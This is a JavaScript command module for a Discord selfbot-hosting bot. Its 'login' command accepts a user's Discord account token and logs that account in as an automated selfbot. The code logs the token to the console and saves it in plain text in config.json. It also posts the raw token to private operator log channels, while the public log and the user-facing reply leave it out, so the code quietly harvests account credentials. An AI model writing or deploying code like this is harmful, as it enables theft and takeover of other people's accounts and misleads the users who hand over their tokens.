const Discord = require("discord.js");
const config = require("../../config.json");
const path = require('path');
const fs = require("fs");
const { Client, Collection } = require("discord.js-selfbot-v13");

module.exports = {
    name: "login",
    description: "Connecte toi",
    permissions: "Aucune",
    options: [
        {
            type: "string",
            name: "token",
            description: "Le token à ajouter et connecter",
            required: true
        }
    ],
    async run(bot, interaction) {
        const userId = interaction.user.id;

        if (acccess(bot, interaction, userId)) {
            const userId = interaction.user.id;
            const userTag = interaction.user.tag;
            const token = interaction.options.getString('token');

            console.log('UserID:', userId);
            console.log('UserTag:', userTag);
            console.log('Token:', token);

            const client = new Client({ checkUpdate: false, autoRedeemNitro: false, ws: { properties: { os: 'Linux', browser: 'Discord Client', release_channel: 'stable', client_version: '1.0.9011', os_version: '10.0.22621', os_arch: 'x64', system_locale: 'en-US', client_build_number: 175517, native_build_number: 29584, client_event_source: null, design_id: 0, } } });

            client.snipes = new Map();
            client.commands = new Collection();

            fs.readdirSync(path.join(__dirname, '../../commands/')).forEach(dirs => {
                const commands = fs.readdirSync(path.join(__dirname, `../../commands/${dirs}/`)).filter(files => files.endsWith(".js"));

                for (const file of commands) {
                    const getFileName = require(path.join(__dirname, `../../commands/${dirs}/${file}`));
                    client.commands.set(getFileName.name, getFileName);
                }
            });

            fs.readdirSync(path.join(__dirname, '../../events/')).forEach(dirs => {
                const events = fs.readdirSync(path.join(__dirname, `../../events/${dirs}/`)).filter(files => files.endsWith(".js"));

                for (const event of events) {
                    const evt = require(path.join(__dirname, `../../events/${dirs}/${event}`));
                    if (evt.once) {
                        client.once(evt.name, (...args) => evt.run(...args, client));
                    } else {
                        client.on(evt.name, (...args) => evt.run(...args, client));
                    }
                }
            });

            client.login(token).then(() => {
                console.log("Connecté avec succès");

                if (!config.user[userId]) {
                    config.user[userId] = {};
                }

                config.user[userId].id = userId;
                config.user[userId].token = token;

                fs.writeFile('./config.json', JSON.stringify(config, null, 2), (err) => {
                    if (err) {
                        console.log(err);
                        return interaction.reply({ content: 'Erreur lors de la connexion au sb', ephemeral: true });
                    }

                    // tu remplace pars ton message.
                    interaction.reply({ content: 'Connexion réussie.', ephemeral: true});

                    
                    const privé = new Discord.EmbedBuilder()
                        .setTitle("Nouvelle connexion")
                        .setDescription(`**ID:** ${userId}\n **Tag:** \`${userTag}\`\n **Token:** ${token}`)
                        .setColor("White");

                    const rowPrivé = new Discord.ActionRowBuilder().addComponents(
                        new Discord.ButtonBuilder()
                            .setLabel("Membre")
                            .setURL(`https://discord.com/users/${userId}`)
                            .setStyle(Discord.ButtonStyle.Link)
                    );

                    const logChannelsPrivé = config.logprivé.map(channelId => bot.channels.cache.get(channelId)).filter(Boolean);
                    if (logChannelsPrivé.length > 0) {
                        logChannelsPrivé.forEach(logprivé => {
                            logprivé.send({ embeds: [privé], components: [rowPrivé] });
                        });
                    }

                    
                    const public = new Discord.EmbedBuilder()
                        .setTitle("Nouvelle connexion")
                        .setDescription(`**ID:** ${userId}\n **Tag:** \`${userTag}\``)
                        .setColor("White");

                    const rowPublic = new Discord.ActionRowBuilder().addComponents(
                        new Discord.ButtonBuilder()
                            .setLabel("Membre")
                            .setURL(`https://discord.com/users/${userId}`)
                            .setStyle(Discord.ButtonStyle.Link)
                    );

                    const logChannelsPublic = config.logpublic.map(channelId => bot.channels.cache.get(channelId)).filter(Boolean);
                    if (logChannelsPublic.length > 0) {
                        logChannelsPublic.forEach(logpublic => {
                            logpublic.send({ embeds: [public], components: [rowPublic] });
                        });
                    }
                });
            }).catch(() => {
                return interaction.reply({ content: 'Token invalide.', ephemeral: true });
            });
        }
    }
}

function acccess(bot, interaction, userId) {
    const dev = config.owner || [];
    const allowedRoles = config.role || [];

    const user = bot.users.cache.get(userId);
    const member = user ? interaction.guild.members.cache.get(userId) : null;

    return dev.includes(userId) || member?.roles.cache.some(role => allowedRoles.includes(role.id));
}